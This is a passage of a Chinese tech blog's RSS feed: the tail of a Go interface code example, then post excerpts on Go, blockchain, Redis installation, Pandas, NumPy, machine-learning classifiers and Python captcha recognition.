&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s is %d years old\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;)
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Address&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;state&lt;/span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;country&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Address&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Describe&lt;/span&gt;() { &lt;span style=&#34;color:#75715e&#34;&gt;//implemented using pointer receiver  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;State %s Country %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;state&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;country&lt;/span&gt;)
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;d1&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Describer&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;p1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sam&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;}
    &lt;span style=&#34;color:#a6e22e&#34;&gt;d1&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;p1&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;d1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Describe&lt;/span&gt;()
    &lt;span style=&#34;color:#a6e22e&#34;&gt;p2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;James&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;}
    &lt;span style=&#34;color:#a6e22e&#34;&gt;d1&lt;/span&gt; = &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;p2&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;d1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Describe&lt;/span&gt;()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;d2&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Describer&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Address&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Washington&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USA&amp;#34;&lt;/span&gt;}

    &lt;span style=&#34;color:#75715e&#34;&gt;/* compilation error if the following line is
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       uncommented
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       cannot use a (type Address) as type Describer
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       in assignment: Address does not implement
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       Describer (Describe method has pointer
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       receiver)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    */&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;//d2 = a
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;d2&lt;/span&gt; = &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;//This works since Describer interface
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//is implemented by Address pointer in line 22
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;d2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Describe&lt;/span&gt;()

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>GO语言学习笔记-接口1</title>
      <link>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8E%A5%E5%8F%A31/</link>
      <pubDate>Tue, 22 May 2018 18:29:47 +0000</pubDate>
      
      <guid>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8E%A5%E5%8F%A31/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://golangbot.com/interfaces-part-1/&#34;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;接口是什么&#34;&gt;接口是什么？&lt;/h2&gt;
&lt;p&gt;在面向对象的世界中，接口的意思是：“接口定义了对象的行为”。它只表明对象应该能做什么，而具体怎么做则由对象内部实现。&lt;/p&gt;
&lt;p&gt;Go语言中，接口是方法的集合，若某个类型实现了接口中定义的所有方法，则可以说这个类型实现了这个接口。用OOP的形式来说就是： &lt;strong&gt;接口表明了类型应该有哪些方法，而类型则决定如何实现那些方法&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;比如，&lt;code&gt;WashingMachine&lt;/code&gt;这个接口中可以定义&lt;code&gt;Cleaning()&lt;/code&gt;和&lt;code&gt;Drying()&lt;/code&gt;方法，任何类型实现了这２个方法都可以说是实现了&lt;code&gt;WashingMachine&lt;/code&gt;接口。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>200行GO代码实现区块链2</title>
      <link>/posts/200%E8%A1%8Cgo%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE2/</link>
      <pubDate>Mon, 21 May 2018 21:32:59 +0000</pubDate>
      
      <guid>/posts/200%E8%A1%8Cgo%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE2/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://medium.com/@mycoralhealth/part-2-networking-code-your-own-blockchain-in-less-than-200-lines-of-go-17fe1dad46e1&#34;&gt;原文&lt;/a&gt;，需要科学上网。省略了一些无关的内容。&lt;/p&gt;
&lt;p&gt;上篇文章我们学习了如何编写区块链并且对进行Hash运算和验证，但所有都运行在一个节点。我们如何让其他的节点连接到我们的主节点并让这些新节点贡献新区块呢？并且，我们如何通知所有的节点区块链有更新呢？&lt;/p&gt;
&lt;p&gt;这篇文章将进行就解答。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>200行GO代码实现区块链1</title>
      <link>/posts/200%E8%A1%8Cgo%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE1/</link>
      <pubDate>Fri, 18 May 2018 14:42:11 +0000</pubDate>
      
      <guid>/posts/200%E8%A1%8Cgo%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE1/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://medium.com/@mycoralhealth/code-your-own-blockchain-in-less-than-200-lines-of-go-e296282bcffc&#34;&gt;原文&lt;/a&gt;，需要科学上网。省略了一些无关的内容。&lt;/p&gt;
&lt;p&gt;世界上很多开发者听说过区块链却不知道它是怎么工作的，他们或许仅仅听过比特币或者智能合约一类的名词。这篇文章尝试用简明的语言说明区块链并且用不到200行的代码来实现你自己的区块链！文章的最后，你应该可以运行并且添加区块到区块链中并从浏览器中看到结果。&lt;/p&gt;
&lt;p&gt;有什么学习区块链的方法比你亲自实现一个更好呢？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文章讲了什么&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如何创建自己的区块链&lt;/li&gt;
&lt;li&gt;如何使用Hash来维护区块链的完整性&lt;/li&gt;
&lt;li&gt;如何添加新区块&lt;/li&gt;
&lt;li&gt;如何解决多个节点同时生成区块导致冲突问题&lt;/li&gt;
&lt;li&gt;如何在浏览器中查看区块链&lt;/li&gt;
&lt;li&gt;如何生成新区块&lt;/li&gt;
&lt;li&gt;了解区块链的基础知识后，你可以决定你的未来发展方向&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;文章没讲什么&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为了保持简单，我们并没介绍更高级的概念比如pow和pos的对比，我们模拟了网络交互所以你可以看到区块链并且添加区块，但网络广播部分将以后再讲。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>区块链学习笔记1</title>
      <link>/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</link>
      <pubDate>Mon, 14 May 2018 16:39:02 +0000</pubDate>
      
      <guid>/posts/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</guid>
      <description>&lt;p&gt;&lt;em&gt;&lt;strong&gt;区块链不等于ＸＸ币!&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;区块链不等于ＸＸ币!&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;区块链不等于ＸＸ币!&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;区块链本质是一种 &lt;strong&gt;去中心化的不可修改的分布式数据库&lt;/strong&gt;，&lt;strong&gt;核心要解决的是信任问题&lt;/strong&gt;。 根据场景可以分为3类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;公开链&lt;/li&gt;
&lt;li&gt;私有链&lt;/li&gt;
&lt;li&gt;联盟链&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;著名的BTC以及各种XX币大多都是基于公开链的第一代应用，而以太坊(Ethereum)则更进一步，可以说是第二代的区块链应用。基于以太坊，更是诞生了智能合约(Smart contracts)应用，大大简化了编写区块链应用的难度。&lt;/p&gt;
&lt;p&gt;而联盟链，现在最火的就是Linux基金会旗下的超级账本(hyperledger)了，相对而言，我个人更看好这个。另外还有个叫做闪电网络的(个人觉得这货有点类似于资金池，略有违背去中心化的初衷)，也值得关注。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Effective-Go中文翻译</title>
      <link>/posts/effective-go%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/</link>
      <pubDate>Mon, 07 May 2018 17:59:59 +0000</pubDate>
      
      <guid>/posts/effective-go%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/</guid>
      <description>&lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#%E4%BB%8B%E7%BB%8D&#34;&gt;介绍&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#%E4%BE%8B%E5%AD%90&#34;&gt;例子&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC&#34;&gt;代码风格&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E6%B3%A8%E9%87%8A&#34;&gt;注释&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83&#34;&gt;命名规范&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;a href=&#34;https://golang.google.cn/doc/effective_go.html&#34;&gt;原文链接&lt;/a&gt;，省略了一些无关的句子。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://go-zh.org/doc/effective_go.html&#34;&gt;这里&lt;/a&gt;有别人翻译好的，需要翻墙。&lt;/p&gt;
&lt;h1 id=&#34;介绍&#34;&gt;介绍&lt;/h1&gt;
&lt;p&gt;Go是一种新的语言，尽管它从其他语言中借鉴了很多特性，但有些不同寻常的特性让Go语言程序和其他程序有所不同。想要直接把C++或者Java代码转换成Go不会得到令人满意的结果，Java程序是用Java写的而不是GO。另一方面，从GO的角度来考虑问题可以写出成功运行但略有不同的程序。换句话说，想要写出好的GO程序，了解其特性是很重要的。同样，了解约定俗成的惯例也很重要，比如命名、格式、项目结构，这样你写的代码才能方便其他GO语言程序员理解。&lt;/p&gt;
&lt;p&gt;这篇文档给你一些小建议以便写出简洁且符合规范的GO代码。看这篇文档前建议先看&lt;a href=&#34;https://golang.google.cn/ref/spec&#34;&gt;language specification&lt;/a&gt;，&lt;a href=&#34;https://tour.golang.org/&#34;&gt;the Tour of Go&lt;/a&gt;，和 &lt;a href=&#34;https://golang.google.cn/doc/code.html&#34;&gt;How to Write Go Code&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;例子&#34;&gt;例子&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://golang.google.cn/src/&#34;&gt;GO源码&lt;/a&gt;不仅仅是作为核心库来使用，更可以用作写代码的实例参考。此外，你可以直接在&lt;a href=&#34;https://golang.org/&#34;&gt;官网&lt;/a&gt;上运行那些没有额外依赖的程序，比如&lt;a href=&#34;https://golang.org/pkg/strings/#example_Map&#34;&gt;这个&lt;/a&gt;。如果你有关于如何解决或实现某个问题的疑问，标准库中的文档、代码、例子可以提供答案或者思路。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>redis主从复制-切换配置</title>
      <link>/posts/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E5%88%87%E6%8D%A2%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Tue, 16 Jan 2018 10:56:48 +0000</pubDate>
      
      <guid>/posts/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E5%88%87%E6%8D%A2%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;首先从官网下载源码进行安装:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wget http://download.redis.io/releases/redis-3.2.1.tar.gz
tar -zxvf redis-3.2.1.tar.gz
make &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make test
sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;默认安装到&lt;code&gt;/usr/local/bin&lt;/code&gt;目录。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python验证码识别实战2</title>
      <link>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E5%AE%9E%E6%88%982/</link>
      <pubDate>Sat, 06 Jan 2018 16:27:04 +0000</pubDate>
      
      <guid>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E5%AE%9E%E6%88%982/</guid>
      <description>&lt;p&gt;在&lt;a href=&#34;http://www.hi-roy.com/2017/12/29/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E5%AE%9E%E6%88%98/&#34;&gt;上一篇文章&lt;/a&gt;中，我们使用sklearn对验证码进行了识别，为了提高识别率，今天来进行进一步优化。&lt;/p&gt;
&lt;p&gt;观察验证码后，发现还可以对其进行旋转处理，这个验证码旋转角度在-30～30之间，那么如何判断旋转角度呢？这里我使用最简单粗暴的判断方式——如果旋转后的字符宽度小于旋转之前，则认为是合理的旋转。但这里还有一个问题需要处理，上一篇文章中我们为了简便直接根据固定的宽度对字符进行了分割，但是分割后字符在小图片中的位置不是固定的，需要手动将其放在中心位置。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python验证码识别实战</title>
      <link>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E5%AE%9E%E6%88%98/</link>
      <pubDate>Fri, 29 Dec 2017 19:07:39 +0000</pubDate>
      
      <guid>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E5%AE%9E%E6%88%98/</guid>
      <description>&lt;p&gt;陆陆续续的学习了验证码的灰度、二值化、分割等方法，还了解了机器学习中最基本的3个分类方式——KNN、决策树、朴素贝叶斯。基于这些，今天结合这些工具来写一个简单的验证码识别程序，本来想使用现有的库来生成验证码，但无意间发现了之前写某个程序时下载的200个验证码，正好可以拿来练手。另外，虽然之前已经实现了上面3种算法，但这里还是会使用&lt;code&gt;sklearn&lt;/code&gt;这个强大的三方库，学习原理是为了知其所以然，有现成工具还是要拿来用的。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>朴素贝叶斯</title>
      <link>/posts/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/</link>
      <pubDate>Thu, 21 Dec 2017 20:01:41 +0000</pubDate>
      
      <guid>/posts/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/</guid>
      <description>&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;朴素贝叶斯是贝叶斯决策理论的一部分，贝叶斯概率引入先验知识和逻辑推理来处理不确定命题。又可以称为“条件概率”（Conditional probability），与之相对的则是“频数概率”（frequency probability）。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>基于虚拟可视化的网页分割</title>
      <link>/posts/%E5%9F%BA%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9A%84%E7%BD%91%E9%A1%B5%E5%88%86%E5%89%B2/</link>
      <pubDate>Fri, 01 Dec 2017 14:22:53 +0000</pubDate>
      
      <guid>/posts/%E5%9F%BA%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9A%84%E7%BD%91%E9%A1%B5%E5%88%86%E5%89%B2/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://blog.mapado.com/web-page-segmentation-by-visual-clustering/&#34;&gt;原文地址&lt;/a&gt;，向原作者表示感谢。&lt;/p&gt;
&lt;p&gt;我们在Mapado的工作就是收集世界上所有“要做的事”。&lt;/p&gt;
&lt;p&gt;为了得到大量数据，我们抓取整个网络，就像Goole做的那样，搜集所有关于演唱会、演出、访问、景点……当我们发现一个有趣的页面，我们就尝试从这个页面提取“好”的数据。&lt;/p&gt;
&lt;p&gt;我们面临的一个主要挑战就是如何从垃圾信息中(广告、导航栏、页脚、相关内容……)分离我们感兴趣的内容(标题、简介、图片、日期……)&lt;/p&gt;
&lt;p&gt;在这个挑战中，一个任务就是重组在视觉上相近的内容。通常，组成页面主要部分的元素相互之间距离是很近的。&lt;/p&gt;
&lt;p&gt;当我们开始进行任务时，很天真的以为可以操作DOM来实现。在DOM中，元素以层级结构存储，所以在同一个父元素中的元素很大可能是相关的。&lt;/p&gt;
&lt;p&gt;一个非常有趣的介绍页面分割的论文可以在这里找到 &lt;a href=&#34;http://wims.vestforsk.no/slides/alcic.pdf&#34;&gt;Page Segmentation by Web Content Clustering&lt;/a&gt;。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>10分钟入门Pandas</title>
      <link>/posts/10%E5%88%86%E9%92%9F%E5%85%A5%E9%97%A8pandas/</link>
      <pubDate>Mon, 30 Oct 2017 11:38:23 +0000</pubDate>
      
      <guid>/posts/10%E5%88%86%E9%92%9F%E5%85%A5%E9%97%A8pandas/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://pandas.pydata.org/pandas-docs/stable/10min.html&#34;&gt;原文地址&lt;/a&gt;，是官网的《10 Minutes to pandas》翻译，代码中添加了个人的一些注释。&lt;/p&gt;
&lt;p&gt;通常来说，我们像下面这样来引入包:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pandas &lt;span style=&#34;color:#f92672&#34;&gt;as&lt;/span&gt; pd

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; numpy &lt;span style=&#34;color:#f92672&#34;&gt;as&lt;/span&gt; np

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; matplotlib.pyplot &lt;span style=&#34;color:#f92672&#34;&gt;as&lt;/span&gt; plt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>决策树</title>
      <link>/posts/%E5%86%B3%E7%AD%96%E6%A0%91/</link>
      <pubDate>Tue, 17 Oct 2017 20:55:02 +0000</pubDate>
      
      <guid>/posts/%E5%86%B3%E7%AD%96%E6%A0%91/</guid>
      <description>&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;决策树是机器学习中一种简单明了的分类算法，用程序语言描述就是&lt;code&gt;if...elif...else...&lt;/code&gt;，关键问题则是如何选择合适的特征对数据集进行切割，常见算法有： ID3、C4.5、CART等。&lt;/p&gt;
&lt;p&gt;今天主要记录一下ID3这个算法，想使用这个算法首先要了解信息增益，想了解信息增益则要先明白什么是&amp;quot;熵&amp;rdquo;。熵描述了一个系统的混乱复杂程度，有一个理论叫做&amp;quot;熵增加&amp;rdquo;，含义就是一个没有外力干涉的系统混乱程度总是增加的，比如一个房间如果没人打扫的话只会越来越混乱，而不会自己变得整洁。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python验证码识别6:kNN</title>
      <link>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB6/</link>
      <pubDate>Sat, 14 Oct 2017 11:30:49 +0000</pubDate>
      
      <guid>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB6/</guid>
      <description>&lt;p&gt;什么是kNN?kNN(k-Nearest Neighbors)是机器学习中处理分类问题的一种简单明了的算法。核心精髓就是老祖宗几百年前留下的言语&amp;quot;物以类聚，人以群居&amp;rdquo;。忘记从哪里看到的一个说法：&amp;ldquo;你身边最好的6个朋友的平均薪资，就是你的薪资水平。&amp;ldquo;这就是kNN算法的一个应用了吧，另外我觉得之前几篇给验证码降噪用的连通域算法，分割用的滴水算法，都有kNN的味道在里面。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>numpy学习笔记2</title>
      <link>/posts/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</link>
      <pubDate>Fri, 13 Oct 2017 15:55:31 +0000</pubDate>
      
      <guid>/posts/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</guid>
      <description>&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;之前一直有个疑惑，为什么要使用numpy？更本质的说，为什么要使用矩阵？矩阵是什么？意味着什么？关于关于矩阵的问题，这里推荐一个&lt;a href=&#34;https://www.bilibili.com/video/av6731067/&#34;&gt;系列视频&lt;/a&gt;，讲的非常非常好。至于为什么用numpy，从程序的角度来讲，我认为最大的好处就是减少代码量以及提高效率(恩，写此文的时候觉得这是一句废话，但确实困扰了我一阵&amp;hellip;&amp;hellip;)&lt;/p&gt;
&lt;p&gt;比如，在学习KNN算法时需要计算欧式距离，公式如下：&lt;/p&gt;
&lt;p&gt;$$d=\sqrt{ {({A_0}-{B_0})^2}+{({A_1}-{B_1})^2}+{({A_2}-{B_2})^2}+{({A_3}-{B_3})^2}+&amp;hellip; }$$&lt;/p&gt;
&lt;p&gt;这里用2维为例，公式变成：&lt;/p&gt;
&lt;p&gt;$$d=\sqrt{ {({A_0}-{B_0})^2}+{({A_1}-{B_1})^2} }$$&lt;/p&gt;
&lt;p&gt;这货貌似是已知直角三角形直角边求斜边长啊？&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python验证码识别5:滴水算法补充</title>
      <link>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB5/</link>
      <pubDate>Tue, 26 Sep 2017 15:51:23 +0000</pubDate>
      
      <guid>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB5/</guid>
      <description>关于之前说的滴水算法，一直以为看不懂是因为智商不够，直到上周腾出时间看了原版论文才恍然大悟……之前看的都是“残篇”，怪不得很多地方看的都稀里糊涂的！
所以有英语能力的还是要看一手资料才行啊！否则看二手甚至多手的东西有时候会让人怀疑智商。
这里原版的论文链接 提供给各位，60280.pdf是最最原版的滴水算法，dropfall.pdf是经过改造的《基于惯性的滴水算法》和《基于惯性的大滴水算法》。另外改造版的算法是国人发表的，看的时候一种自豪感油然而生，虽然我也不知道自豪个什么劲……
基于惯性的滴水算法为了解决传统滴水算法遇到有“毛边”的情况，在传统水滴算法基础上多考虑了之前一步的方向。比如周围5个点都是黑或者白时，传统算法是应该向下滴落，但如果之前一步的方向是向右，那么综合考虑后滴落方向就变成了右下。另外，在基于惯性的滴水算法中，“左”是受到“歧视”的。
再进一步，对于类似字母Y这种凹陷情况，把判断范围扩大而不是仅仅考虑某一个像素点，就变成了基于惯性的大滴水算法了。
另外，关于起始点的选择，原版论文中是从上到下、从左到右依次遍历所有像素，找到第一个 左侧为黑色像素、右侧有黑的像素的白色像素点 开始滴落（确实挺拗口，看论文中的图就明白了）。
至于代码，先挖坑病好以后有空再和大家一起讨论分享。</description>
    </item>
    
    <item>
      <title>python验证码识别4:滴水算法分割图片</title>
      <link>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB4/</link>
      <pubDate>Fri, 22 Sep 2017 16:50:04 +0000</pubDate>
      
      <guid>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB4/</guid>
      <description>&lt;p&gt;之前提过对于有粘连的字符可以使用滴水算法来解决分割，但智商捉急的我实在是领悟不了这个算法的精髓，幸好有小伙伴已经实现相关&lt;a href=&#34;https://github.com/lan2720/fuck-captcha/blob/master/fuck_sjtu_captcha.py&#34;&gt;代码&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;我对上面的代码进行了一些小修改，同时升级为python3的代码。&lt;/p&gt;
&lt;p&gt;还是以这张图片为例：&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;在以前的我们已经知道这种简单的粘连可以通过控制阈值来实现分割，这里我们使用滴水算法。&lt;/p&gt;
&lt;p&gt;首先使用&lt;a href=&#34;http://www.hi-roy.com/2017/09/20/Python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB2/&#34;&gt;之前文章&lt;/a&gt;中介绍的垂直投影或者连通域先进行一次切割处理，得到结果如下：&lt;/p&gt;
